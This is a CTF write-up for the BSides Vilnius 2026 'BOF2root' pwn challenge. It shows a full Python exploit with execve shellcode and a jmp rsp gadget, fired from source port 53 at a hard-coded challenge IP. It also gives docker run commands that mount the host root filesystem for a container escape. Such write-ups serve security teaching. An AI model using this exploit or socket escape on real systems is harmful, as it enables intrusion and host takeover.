---
title: "BOF2root - BSides Vilnius 2026 Pwn Challenge Writeup"
description: "BSides Vilnius 2026 BOF2root writeup. Bypass a source-port ACL, exploit a classic stack overflow into an executable stack, then escape the container via the Docker socket."
ctf: "BSides Vilnius 2026"
date: 2026-06-01
category: pwn
difficulty: medium
points: 150
flag_format: "BSIDES{...}"
author: "zeba"
---

# BOF2root

**BSides Vilnius 2026** · Pwn · Medium

## Solution Overview

The gateway service was hidden behind a source-port ACL — it only answered connections originating from source port `53`. Once I bound my client socket to port 53, the provided `adminpanel` binary fell to a textbook stack overflow into an executable stack (`jmp rsp` + shellcode). The shell landed inside a Docker container whose user was in the `dockersock` group, so the Docker socket became a read-only window onto the host filesystem — enough to collect all four flags.

## Tools Used

- Python 3 (raw sockets with a pinned source port; no pwntools needed)
- A bit of shellcode and one `jmp rsp` gadget
- The Docker CLI, reachable from inside the container via the socket

## Artifacts

- [`challenge/adminpanel`](challenge/adminpanel) — the vulnerable non-PIE ELF gateway binary (exec stack, no canary)

## Solution

### Step 1: The service that ignores you

Direct TCP and TLS connections to `85.217.171.62:8443` simply timed out. That's not a crash — that's a firewall. The hint that unlocked it was that the gateway enforced a **source-port ACL**: it only accepted clients connecting *from* source port `53` (DNS), a common "looks like legitimate egress" trick.

**First thought:** "It's not down, it's filtering on my source port — pin the client to 53."

Binding a TCP client to a privileged source port needs `SO_REUSEADDR`/`SO_REUSEPORT` (and root, since 53 is privileged), plus a zero `SO_LINGER` so rapid reconnects don't get stuck in `TIME_WAIT`. With that, the gateway answered.

### Step 2: Overflow into an executable stack

The `adminpanel` ELF was the easy part once I could reach it: non-PIE, **executable stack**, and a function that reads `0x100` bytes into a `0x40` buffer. With a `jmp rsp` gadget sitting at `0x401210`, the recipe is the most classic one there is — `72` bytes of padding, the gadget address, then `/bin/sh` shellcode placed right where `rsp` points after the return.

```python
import select
import socket
import struct
import time

HOST = "85.217.171.62"
PORT = 8443
SOURCE_PORT = 53
JMP_RSP = 0x401210

SHELLCODE = bytes.fromhex(
    "4831f65648bf2f62696e2f2f736857545f6a3b58990f05"
)
PAYLOAD = b"A" * 72 + struct.pack("<Q", JMP_RSP) + SHELLCODE


def run_remote(command: str, timeout: int = 30) -> str:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    if hasattr(socket, "SO_REUSEPORT"):
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack("ii", 1, 0))
    sock.settimeout(8)
    sock.bind(("", SOURCE_PORT))
    sock.connect((HOST, PORT))

    sock.recv(4096)
    sock.sendall(PAYLOAD)
    time.sleep(0.3)
    sock.recv(4096)
    sock.sendall((command + "\n").encode())

    output = b""
    sock.setblocking(False)
    deadline = time.time() + timeout
    while time.time() < deadline:
        readable, _, _ = select.select([sock], [], [], 0.5)
        if readable:
            chunk = sock.recv(32768)
            if not chunk:
                break
            output += chunk
    sock.close()
    return output.decode("latin1", errors="replace")
```

### Step 3: The Docker socket is the real root

The shell landed as user `ctf` *inside a container*, not on the host. But `id` showed membership in the `dockersock` group — and access to the Docker socket is effectively root on the host. From there I could launch throwaway containers that mount the host filesystem read-only (`-v /:/host:ro`) and read whatever I wanted.

The only wrinkle: the root flag was an *executable* at `/host/root/root_flag`, and running it directly failed on a GLIBC mismatch (container runtime vs host binary). The fix was to `chroot /host` first so it ran against the host's own libraries. One scripted command swept up all four flags:

```python
command = r'''
echo __BOF__
cat /home/ctf/bof.txt

echo __USER__
docker run --rm --network none -v /:/host:ro --entrypoint /bin/sh a90625cff106 -c '
  grep -aoh "BSIDES{[^}]*}" /host/home/ubuntu/user.txt
'

echo __DOCKER__
docker run --rm --network none -v /:/host:ro --entrypoint /bin/sh a90625cff106 -c '
  find /host -path /host/proc -prune -o -path /host/sys -prune -o -path /host/dev -prune -o -name docker.txt -print 2>/dev/null |
  head -1 |
  while read f; do grep -aoh "BSIDES{[^}]*}" "$f"; done
'

echo __ROOT__
docker run --rm --network none -v /:/host:ro --entrypoint /bin/sh a90625cff106 -c '
  chroot /host /root/root_flag 2>/dev/null | grep -aoh "BSIDES{[^}]*}"
'
'''

print(run_remote(command))
```

The `bof.txt` flag came straight from the initial shell; `user.txt` from the host mount; `docker.txt` was buried in the overlay storage and found with a pruned `find`; and `root.txt` from `chroot`-ing into the host to run its flag binary.

## Flags

```text
bof.txt:    BSIDES{A1b2C3d4E5f6G7h8I9jK}
docker.txt: BSIDES{L9m8N7o6P5q4R3s2T1uV}
user.txt:   BSIDES{Q1w2E3r4T5y6U7i8O9pA}
root.txt:   BSIDES{Z9x8C7v6B5n4M3k2J1hG}
```

---

[← Back to BSides Vilnius 2026](../../README.md)
